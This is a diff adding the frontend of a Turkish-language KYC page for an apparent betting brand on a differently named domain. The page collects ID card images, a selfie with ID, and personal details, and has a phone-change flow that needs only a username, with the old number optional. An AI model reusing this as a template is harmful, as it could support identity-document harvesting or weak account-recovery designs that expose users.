+                  <option value="AT">Avusturya</option>
+                  <option value="BE">Belçika</option>
+                  <option value="FR">Fransa</option>
+                  <option value="UK">Birleşik Krallık</option>
+                  <option value="OTHER">Diğer</option>
+                </select>
+                <span class="field-error">Ülke seçimi zorunludur.</span>
+              </label>
+              <label class="field" style="grid-column:1 / -1"><span class="field-label">Telefon</span><input class="input" name="phone" type="tel" placeholder="+90 555 000 00 00"><span class="field-help">Gerekmedikçe doldurmanıza gerek yoktur.</span></label>
+            </div>
+          </div>
+
+          <!-- Step 3 -->
+          <div class="step-content" data-content="3" hidden>
+            <h2 class="step-title">Belge Yükleme</h2>
+            <p class="step-desc">Aşağıdaki üç belgeyi net ve okunaklı olacak şekilde yükleyin. Mobilde kamera, galeri veya dosyalardan seçim yapabilirsiniz · Maksimum boyut: <strong>10 MB</strong>.</p>
+            <div class="trust">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 4 6v6c0 5 3.5 9.3 8 10 4.5-.7 8-5 8-10V6l-8-4Z"/></svg>
+              <span><strong>Belgeleriniz şifreli depolamaya alınır.</strong> Yalnızca yetkili doğrulama personeli tarafından görüntülenebilir.</span>
+            </div>
+
+            <div class="uploads" data-uploads="kyc"></div>
+          </div>
+
+          <!-- Step 4 -->
+          <div class="step-content" data-content="4" hidden>
+            <h2 class="step-title">Özet ve Gönderim</h2>
+            <p class="step-desc">Aşağıdaki bilgileri kontrol edin. Onay verdiğinizde belgeleriniz inceleme için iletilecektir.</p>
+            <div class="summary" id="summary"></div>
+            <label class="consent">
+              <input type="checkbox" id="consent" required>
+              <span>Yüklediğim belgelerin <strong>kendime ait, gerçek ve güncel</strong> olduğunu onaylıyorum. Bilgilerimin yalnızca hesap doğrulama amacıyla işleneceğini ve <a href="#kvkk" target="_blank" rel="noopener">KVKK / GDPR aydınlatma metni</a> kapsamında saklanacağını kabul ediyorum.</span>
+            </label>
+          </div>
+
+          <!-- Step navigation -->
+          <div class="step-nav">
+            <div class="left">
+              <button type="button" class="btn btn-ghost" id="btn-prev" disabled>← Geri</button>
+            </div>
+            <div class="step-counter"><span id="step-current">1</span> / 4</div>
+            <div class="right">
+              <button type="button" class="btn btn-primary" id="btn-next">Devam Et →</button>
+              <button type="submit" class="btn btn-primary" id="btn-submit" hidden>Gönder ✓</button>
+            </div>
+          </div>
+
+        </form>
+      </div>
+    </section>
+
+    <!-- =========== PHONE =========== -->
+    <section id="view-phone" class="view">
+      <div class="page-head">
+        <a href="#" class="back" data-go="home">← Ana sayfaya dön</a>
+        <h1>Telefon Güncelleme</h1>
+        <p>Yeni telefon numaranızı doğrulamak için kimlik belgelerinizi de yüklemeniz gerekir.</p>
+      </div>
+
+      <div class="card card-narrow">
+        <div class="trust">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span><strong>Güvenli işlem.</strong> Tek kullanımlık doğrulama kodu yalnızca yeni numaranıza gönderilir.</span>
+        </div>
+        <div class="form-alert" id="alert-phone" role="alert" aria-live="assertive"></div>
+        <form id="form-phone" novalidate aria-label="Telefon güncelleme formu">
+          <div class="form-row"><label class="field"><span class="field-label">Kullanıcı Adı <span class="req">*</span></span><input class="input" name="username" required placeholder="kullaniciadiniz"><span class="field-error">Kullanıcı adı zorunludur.</span></label></div>
+          <div class="form-grid">
+            <label class="field"><span class="field-label">Eski Telefon</span><input class="input" name="currentPhone" type="tel" placeholder="+90 555 000 00 00"><span class="field-help">İsteğe bağlı — hatırlamıyorsanız boş bırakabilirsiniz.</span></label>
+            <label class="field"><span class="field-label">Yeni Telefon <span class="req">*</span></span><input class="input" name="newPhone" type="tel" required placeholder="+90 555 000 00 00"><span class="field-error">Yeni telefon numarası gereklidir.</span></label>
+          </div>
+
+          <div class="section-divider"></div>
+          <h3 class="section-title">Kimlik Doğrulama Belgeleri <span class="req">*</span></h3>
+          <p class="section-desc">Hesap güvenliğiniz için telefon değişikliklerinde kimlik belgeleriniz doğrulanır. Aşağıdaki üç belgeyi yükleyin (kamera, galeri veya dosya · Maks. 10 MB).</p>
+          <div class="uploads" data-uploads="phone"></div>
+
+          <label class="consent">
+            <input type="checkbox" id="consent-phone" required>
+            <span>Yüklediğim belgelerin <strong>kendime ait, gerçek ve güncel</strong> olduğunu onaylıyorum. Bilgilerimin yalnızca hesap doğrulama amacıyla işleneceğini ve <a href="#kvkk" target="_blank" rel="noopener">KVKK / GDPR aydınlatma metni</a> kapsamında saklanacağını kabul ediyorum.</span>
+          </label>
+
+          <div class="form-row" style="margin-top:18px"><button type="submit" class="btn btn-primary btn-block btn-lg">Talebi Gönder</button></div>
+        </form>
+      </div>
+    </section>
+
+    <!-- =========== SUCCESS =========== -->
+    <section id="view-success" class="view">
+      <div class="success-wrap">
+        <div class="success-circle"><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg></div>
+        <h2 id="success-title">Belgeleriniz Alınmıştır</h2>
+        <p id="success-desc">Tüm belgeleriniz başarıyla yüklendi. İnceleme tamamlandığında e-posta adresinize bilgilendirme yapılacaktır.</p>
+        <div id="success-ref" class="success-ref" hidden>
+          <span>Talep numaranız:</span>
+          <code id="success-ref-id">—</code>
+          <small>Bu numarayı destekle iletişime geçerken kullanın.</small>
+        </div>
+        <div class="success-meta">
+          <svg width="16" height="16" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          İnceleme süresi: 24 saat
+        </div>
+        <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">
+          <button class="btn btn-primary" data-go="home">Ana Sayfaya Dön</button>
+          <a class="btn btn-ghost" href="#">Destek ile İletişim</a>
+        </div>
+      </div>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div class="container foot">
+    <span>© <span id="year">2026</span> Almanbahis Doğrulama Platformu · abonay.co — Tüm hakları saklıdır.</span>
+    <div class="foot-links">
+      <a href="#">Gizlilik</a>
+      <a href="#">KVKK</a>
+      <a href="#">Çerez Politikası</a>
+      <a href="#">Destek</a>
+    </div>
+    <span class="age-pill"><span class="age-circle">18</span> Yalnızca 18 yaş üstü</span>
+  </div>
+</footer>
+
+<div class="toasts" id="toasts"></div>
+
+<!--Begin Comm100 Live Chat Code-->
+<div id="comm100-button-47ae1ee9-5e46-421f-9b1d-7cfed20fb1c3"></div>
+<script type="text/javascript">
+  var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:"47ae1ee9-5e46-421f-9b1d-7cfed20fb1c3",div_id:"comm100-button-47ae1ee9-5e46-421f-9b1d-7cfed20fb1c3"}),t.site_id=90006145,t.main_code_plan="47ae1ee9-5e46-421f-9b1d-7cfed20fb1c3",e("https://service.j72t3w6u6c.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://service.zeyqr26pwk.com/livechat.ashx?siteId=")},5e3)})(Comm100API||{})
+</script>
+<!--End Comm100 Live Chat Code-->
+
+<script>
+/* ============================================================
+   abonay.co — KYC App
+   - state IIFE içinde gizli (window.state yok)
+   - URL.createObjectURL + revoke (FileReader yerine, bellek sızdırmaz)
+   - aria-invalid + aria-describedby + ilk hatalı alana otomatik focus
+   - Toast yerine kalıcı .form-alert (role=alert, aria-live)
+   - Submit gerçek backend'e (/api/submit)
+   ============================================================ */
+(function(){
+
+const UPLOAD_DEFS = [
+  {
+    key:'idFront',
+    title:'Kimlik Ön Yüz',
+    desc:'TC kimlik kartı veya pasaport ön yüzünün net fotoğrafı.',
+    icon:'<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/>'
+  },
+  {
+    key:'idBack',
+    title:'Kimlik Arka Yüz',
+    desc:'Kimlik kartınızın arka yüzünün okunaklı fotoğrafı.',
+    icon:'<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/>'
+  },
+  {
+    key:'selfie',
+    title:'Selfie',
+    desc:'Kimlik kartınızı elinizde tutarken çekilmiş selfie. Selfie sırasında elinizde sitemizin domain adının yazılı olduğu not kağıdı olmalıdır.',
+    icon:'<path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2Z"/><circle cx="12" cy="13" r="4"/>'
+  }
+];
+const FILE_KEYS = UPLOAD_DEFS.map(d => d.key);
+const FILE_LABELS = UPLOAD_DEFS.reduce((m,d)=>(m[d.key]=d.title,m), {});
+const SCOPES = ['kyc','email','phone'];
+const MAX_BYTES = 10 * 1024 * 1024;
+
+const state = {
+  view:'home',
+  step:1,
+  data:{ fullName:'', username:'', email:'', dob:'', country:'', phone:'' },
+  files: SCOPES.reduce((m,s)=>{
+    m[s] = FILE_KEYS.reduce((o,k)=>(o[k]=null,o), {});
+    return m;
+  }, {})
+};
+
+/* ---------- Mount upload zones for every scope ---------- */
+function uploadHTML(scope, def){
+  const id = scope + ':' + def.key;
+  return `
+    <div class="upload">
+      <div class="upload-head">
+        <div class="upload-title">${def.title} <span class="req">*</span></div>
+        <div class="upload-desc">${def.desc}</div>
+      </div>
+      <label class="dropzone" data-drop="${id}">
+        <div class="upload-icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">${def.icon}</svg></div>
+        <div class="dropzone-text">Dosya Seç veya Sürükle Bırak</div>
+        <div class="dropzone-hint">Kamera, galeri veya dosya · Maks. 10 MB</div>
+        <input type="file" accept="image/*" data-file="${id}">
+      </label>
+      <div class="preview" data-preview="${id}">
+        <div class="thumb"><span class="file-icon">🖼️</span></div>
+        <div class="preview-info">
+          <div class="preview-name">—</div>
+          <div class="preview-size">—</div>
+          <div class="progress"><div class="progress-bar"></div></div>
+          <div class="preview-done-badge"><svg width="14" height="14" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg> Yükleme tamamlandı</div>
+        </div>
+        <div class="preview-actions"><button type="button" class="icon-btn" data-remove="${id}" aria-label="Kaldır"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18M6 6l12 12"/></svg></button></div>
+      </div>
+      <div class="upload-error" data-error="${id}"></div>
+    </div>`;
+}
+SCOPES.forEach(scope=>{
+  const mount = document.querySelector(`[data-uploads="${scope}"]`);
+  if(mount) mount.innerHTML = UPLOAD_DEFS.map(def => uploadHTML(scope, def)).join('');
+});
+
+/* ---------- Router ---------- */
+function showView(name){
+  state.view = name;
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  const el = document.getElementById('view-'+name);
+  if(el) el.classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+document.addEventListener('click', e=>{
+  const a = e.target.closest('[data-go]');
+  if(a){ e.preventDefault(); showView(a.dataset.go); }
+});
+
+/* ---------- Toasts ---------- */
+function toast(message, type='success'){
+  const wrap = document.getElementById('toasts');
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  const icon = type==='success'
+    ? '<svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>'
+    : '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>';
+  t.innerHTML = `<span class="t-icon">${icon}</span><div>${message}</div>`;
+  wrap.appendChild(t);
+  setTimeout(()=>{ t.style.opacity='0'; t.style.transform='translateX(20px)'; t.style.transition='all .3s'; }, 3500);
+  setTimeout(()=>t.remove(), 3900);
+}
+
+/* ---------- File upload helpers ---------- */
+function parseId(id){ const [scope, key] = id.split(':'); return { scope, key }; }
+function fmtSize(b){
+  if(b<1024) return b+' B';
+  if(b<1024*1024) return (b/1024).toFixed(1)+' KB';
+  return (b/1024/1024).toFixed(2)+' MB';
+}
+function setError(id, msg){
+  const el = document.querySelector(`[data-error="${id}"]`);
+  if(!el) return;
+  if(msg){ el.textContent = msg; el.classList.add('show'); }
+  else { el.textContent = ''; el.classList.remove('show'); }
+}
+function attachFile(id, file){
+  setError(id, '');
+  if(!file.type || !file.type.startsWith('image/')){
+    setError(id, 'Geçersiz dosya türü. Lütfen bir resim dosyası seçin.');
+    return;
+  }
+  if(file.size > MAX_BYTES){
+    setError(id, 'Dosya boyutu 10 MB üst sınırını aşıyor.');
+    return;
+  }
+  const { scope, key } = parseId(id);
+  // Önceki blob URL'ini serbest bırak (memory leak önle)
+  const prev = state.files[scope][key];
+  if(prev && prev.url){ try { URL.revokeObjectURL(prev.url); } catch{} }
+
+  const preview = document.querySelector(`[data-preview="${id}"]`);
+  const dropzone = document.querySelector(`[data-drop="${id}"]`);
+  preview.querySelector('.preview-name').textContent = file.name;
+  preview.querySelector('.preview-size').textContent = fmtSize(file.size);
+  const bar = preview.querySelector('.progress-bar');
+  preview.classList.remove('done');
+  bar.style.width = '0%';
+  preview.classList.add('show');
+  dropzone.style.display = 'none';
+
+  const url = URL.createObjectURL(file);
+  preview.querySelector('.thumb').innerHTML = `<img src="${url}" alt="" loading="lazy">`;
+
+  let p = 0;
+  const intId = setInterval(()=>{
+    p += Math.random()*22 + 8;
+    if(p>=100){ p = 100; clearInterval(intId); preview.classList.add('done'); }
+    bar.style.width = p + '%';
+  }, 150);
+
+  state.files[scope][key] = { name:file.name, size:file.size, type:file.type, file, url };
+}
+function removeFile(id){
+  const { scope, key } = parseId(id);
+  const prev = state.files[scope][key];
+  if(prev && prev.url){ try { URL.revokeObjectURL(prev.url); } catch{} }
+  state.files[scope][key] = null;
+  const preview = document.querySelector(`[data-preview="${id}"]`);
+  const dropzone = document.querySelector(`[data-drop="${id}"]`);
+  if(!preview || !dropzone) return;
+  preview.classList.remove('show','done');
+  preview.querySelector('.thumb').innerHTML = '<span class="file-icon">🖼️</span>';
+  preview.querySelector('.progress-bar').style.width = '0%';
+  dropzone.style.display = '';
+  const input = dropzone.querySelector('input[type=file]');
+  if(input) input.value = '';
+  setError(id, '');
+}
+function resetScope(scope){
+  FILE_KEYS.forEach(k => removeFile(scope+':'+k));
+}
+function checkScopeFiles(scope){
+  const missing = FILE_KEYS.filter(k => !state.files[scope][k]);
+  if(missing.length){
+    toast('Eksik belge: ' + missing.map(m=>FILE_LABELS[m]).join(', '), 'error');
+    return false;
+  }
+  return true;
+}
+
+/* ---------- Bind dropzones (delegated for change/click + per-zone for drag) ---------- */
+document.querySelectorAll('.dropzone[data-drop]').forEach(dz=>{
+  const id = dz.dataset.drop;
+  const input = dz.querySelector('input[type=file]');
+  input.addEventListener('change', e=>{
+    const f = e.target.files[0];
+    if(f) attachFile(id, f);
+  });
+  ['dragenter','dragover'].forEach(ev=>{
+    dz.addEventListener(ev, e=>{ e.preventDefault(); e.stopPropagation(); dz.classList.add('dragover'); });
+  });
+  ['dragleave','drop'].forEach(ev=>{
+    dz.addEventListener(ev, e=>{ e.preventDefault(); e.stopPropagation(); dz.classList.remove('dragover'); });
+  });
+  dz.addEventListener('drop', e=>{
+    const f = e.dataTransfer.files[0];
+    if(f) attachFile(id, f);
+  });
+});
+document.addEventListener('click', e=>{
+  const btn = e.target.closest('[data-remove]');
+  if(btn){ e.preventDefault(); e.stopPropagation(); removeFile(btn.dataset.remove); }
+});
+
+/* ---------- Field validation helper ---------- */
+function validateField(input){
+  const wrap = input.closest('.field');
+  let valid = !!input.value.trim();
+  if(valid && input.type === 'email'){
+    valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input.value.trim());
+  }
+  wrap.classList.toggle('has-error', !valid);
+  input.classList.toggle('error', !valid);
+  input.setAttribute('aria-invalid', valid ? 'false' : 'true');
+  return valid;
+}
+function validateForm(form, names){
+  let ok = true;
+  let firstInvalid = null;
+  names.forEach(n=>{
+    const inp = form.querySelector(`[name="${n}"]`);
+    if(inp && !validateField(inp)){
+      ok = false;
+      if(!firstInvalid) firstInvalid = inp;
+    }
+  });
+  if(firstInvalid){
+    try { firstInvalid.focus({ preventScroll: false }); } catch {}
+    firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+  return ok;
+}
+
+/* ---------- Inline alert (toast yerine kalıcı, screen-reader uyumlu) ---------- */
+function showAlert(scope, message){
+  const el = document.getElementById('alert-' + scope);
+  if(!el) return;
+  el.innerHTML = `<strong>Dikkat:</strong> ${esc(message)}`;
+  el.classList.add('show');
+  el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+function clearAlert(scope){
+  const el = document.getElementById('alert-' + scope);
+  if(!el) return;
+  el.classList.remove('show');
+  el.innerHTML = '';
+}
+
+/* ---------- Stepper (KYC) ---------- */
+function renderStepper(){
+  document.querySelectorAll('.step-node').forEach(n=>{
+    const s = parseInt(n.dataset.step,10);
+    n.classList.toggle('active', s===state.step);
+    n.classList.toggle('done', s<state.step);
+  });
+  document.querySelectorAll('.step-bar').forEach(b=>{
+    const s = parseInt(b.dataset.bar,10);
+    b.classList.toggle('done', s<state.step);
+  });
+  document.querySelectorAll('.step-content').forEach(c=>{
+    c.hidden = parseInt(c.dataset.content,10) !== state.step;
+  });
+  document.getElementById('step-current').textContent = state.step;
+  document.getElementById('btn-prev').disabled = state.step === 1;
+  const isLast = state.step === 4;
+  document.getElementById('btn-next').hidden = isLast;
+  document.getElementById('btn-submit').hidden = !isLast;
+  if(isLast) renderSummary();
+}
+function validateKycStep(s){
+  const form = document.getElementById('form-kyc');
+  const fields = { 1:['fullName','username','email'], 2:['dob','country'], 3:[], 4:[] }[s] || [];
+  let ok = validateForm(form, fields);
+  if(!ok){ showAlert('kyc','Lütfen işaretli alanları kontrol edin.'); return false; }
+  if(s === 3 && !checkScopeFiles('kyc')){ showAlert('kyc','Lütfen tüm belgeleri yükleyin.'); ok = false; }
+  if(s === 4 && !document.getElementById('consent').checked){
+    showAlert('kyc','Lütfen onay kutusunu işaretleyin.');
+    ok = false;
+  }
+  if(ok) clearAlert('kyc');
+  return ok;
+}
+function captureKyc(){
+  const form = document.getElementById('form-kyc');
+  ['fullName','username','email','dob','country','phone'].forEach(n=>{
+    const input = form.querySelector(`[name="${n}"]`);
+    if(input) state.data[n] = input.value.trim();
+  });
+}
+document.getElementById('btn-next').addEventListener('click', ()=>{
+  if(!validateKycStep(state.step)) return;
+  captureKyc();
+  state.step = Math.min(4, state.step + 1);
+  renderStepper();
+});
+document.getElementById('btn-prev').addEventListener('click', ()=>{
+  state.step = Math.max(1, state.step - 1);
+  renderStepper();
+});
+
+/* ---------- Summary (KYC step 4) ---------- */
+function esc(s){return String(s||'').replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function renderSummary(){
+  const d = state.data;
+  const filed = FILE_KEYS.filter(k=>state.files.kyc[k]);
+  document.getElementById('summary').innerHTML = `
+    <div class="summary-row"><div class="summary-label">Ad Soyad</div><div class="summary-value">${esc(d.fullName)}</div></div>
+    <div class="summary-row"><div class="summary-label">Kullanıcı Adı</div><div class="summary-value">${esc(d.username)}</div></div>
+    <div class="summary-row full"><div class="summary-label">E-posta</div><div class="summary-value">${esc(d.email)}</div></div>
+    <div class="summary-row"><div class="summary-label">Doğum Tarihi</div><div class="summary-value">${esc(d.dob||'—')}</div></div>
+    <div class="summary-row"><div class="summary-label">Ülke</div><div class="summary-value">${esc(d.country||'—')}</div></div>
+    <div class="summary-row full"><div class="summary-label">Telefon</div><div class="summary-value">${esc(d.phone||'—')}</div></div>
+    <div class="summary-row full">
+      <div class="summary-label">Yüklenen Belgeler (${filed.length}/4)</div>
+      <div class="summary-files">${filed.map(k=>`<span class="file-chip"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>${FILE_LABELS[k]}</span>`).join('')}</div>
+    </div>`;
+}
+
+/* ---------- Submit handlers (gerçek backend) ---------- */
+function showSuccess(title, desc, refId){
+  document.getElementById('success-title').textContent = title;
+  document.getElementById('success-desc').textContent = desc;
+  const refWrap = document.getElementById('success-ref');
+  const refEl = document.getElementById('success-ref-id');
+  if(refId){ refEl.textContent = refId; refWrap.hidden = false; }
+  else { refWrap.hidden = true; }
+  showView('success');
+}
+
+function buildPayload(scope){
+  if(scope === 'kyc'){
+    return {
+      fullName: state.data.fullName,
+      username: state.data.username,
+      email: state.data.email,
+      dob: state.data.dob,
+      country: state.data.country,
+      phone: state.data.phone || ''
+    };
+  }
+  if(scope === 'email'){
+    const f = document.getElementById('form-email');
+    return {
+      username: f.elements.username.value.trim(),
+      currentEmail: f.elements.currentEmail.value.trim(),
+      newEmail: f.elements.newEmail.value.trim()
+    };
+  }
+  if(scope === 'phone'){
+    const f = document.getElementById('form-phone');
+    return {
+      username: f.elements.username.value.trim(),
+      currentPhone: f.elements.currentPhone.value.trim(),
+      newPhone: f.elements.newPhone.value.trim()
+    };
+  }
+}
+
+async function submitToServer(flow, scope){
+  const fd = new FormData();
+  fd.append('flow', flow);
+  fd.append('payload', JSON.stringify(buildPayload(scope)));
+  for(const k of FILE_KEYS){
+    const item = state.files[scope][k];
+    if(item) fd.append(k, item.file, item.name);
+  }
+  const res = await fetch('/api/submit', {
+    method: 'POST',
+    body: fd,
+    credentials: 'same-origin',
+    headers: { 'Accept': 'application/json' }
+  });
+  let json = null;
+  try { json = await res.json(); } catch {}
+  if(!res.ok){
+    const msg = (json && json.error) ? json.error : `Sunucu hatası (${res.status})`;
+    throw new Error(msg);
+  }
+  return json || {};
+}
+
+async function handleSubmit(scope, btn, opts){
+  clearAlert(scope);
+  const orig = btn.textContent;
+  btn.disabled = true; btn.textContent = 'Gönderiliyor...';
+  try {
+    const flow = scope; // scope ile flow şu an 1:1
+    const json = await submitToServer(flow, scope);
+    showSuccess(opts.title, opts.desc, json.refId);
+    opts.afterSuccess && opts.afterSuccess();
+  } catch (err){
+    showAlert(scope, err.message || 'Bir hata oluştu. Lütfen tekrar deneyin.');
+  } finally {
+    btn.disabled = false; btn.textContent = orig;
+  }
+}
+
+document.getElementById('form-kyc').addEventListener('submit', e=>{
+  e.preventDefault();
+  if(!validateKycStep(4)) return;
+  const btn = document.getElementById('btn-submit');
+  handleSubmit('kyc', btn, {
+    title: 'Belgeleriniz Alınmıştır',
+    desc: 'Tüm belgeleriniz başarıyla yüklendi. İnceleme tamamlandığında e-posta adresinize bilgilendirme yapılacaktır.',
+    afterSuccess: ()=>{
+      state.step = 1; renderStepper();
+      document.getElementById('form-kyc').reset();
+      resetScope('kyc');
+      document.getElementById('consent').checked = false;
+    }
+  });
+});
+
+document.getElementById('form-email').addEventListener('submit', e=>{
+  e.preventDefault();
+  const form = e.target;
+  if(!validateForm(form, ['username','currentEmail','newEmail'])) return;
+  if(!checkScopeFiles('email')){ showAlert('email','Lütfen tüm belgeleri yükleyin.'); return; }
+  if(!document.getElementById('consent-email').checked){
+    showAlert('email','Lütfen onay kutusunu işaretleyin.'); return;
+  }
+  const btn = form.querySelector('button[type=submit]');
+  handleSubmit('email', btn, {
+    title: 'E-posta Talebiniz Alındı',
+    desc: 'Kimlik belgeleriniz incelendikten sonra yeni e-posta adresinize doğrulama bağlantısı gönderilecektir. İnceleme süresi 24 saat.',
+    afterSuccess: ()=>{
+      form.reset(); resetScope('email');
+      document.getElementById('consent-email').checked = false;
+    }
+  });
+});
+
+document.getElementById('form-phone').addEventListener('submit', e=>{
+  e.preventDefault();
+  const form = e.target;
+  if(!validateForm(form, ['username','currentPhone','newPhone'])) return;
+  if(!checkScopeFiles('phone')){ showAlert('phone','Lütfen tüm belgeleri yükleyin.'); return; }
+  if(!document.getElementById('consent-phone').checked){
+    showAlert('phone','Lütfen onay kutusunu işaretleyin.'); return;
+  }
+  const btn = form.querySelector('button[type=submit]');
+  handleSubmit('phone', btn, {
+    title: 'Telefon Talebiniz Alındı',
+    desc: 'Kimlik belgeleriniz incelendikten sonra yeni numaranıza SMS doğrulama kodu gönderilecektir. İnceleme süresi 24 saat.',
+    afterSuccess: ()=>{
+      form.reset(); resetScope('phone');
+      document.getElementById('consent-phone').checked = false;
+    }
+  });
+});
+
+/* ---------- Misc ---------- */
+document.getElementById('year').textContent = new Date().getFullYear();
+renderStepper();
+
+})(); /* IIFE — state ve helper'lar window'a sızmaz */
+</script>
+</body>
+</html>
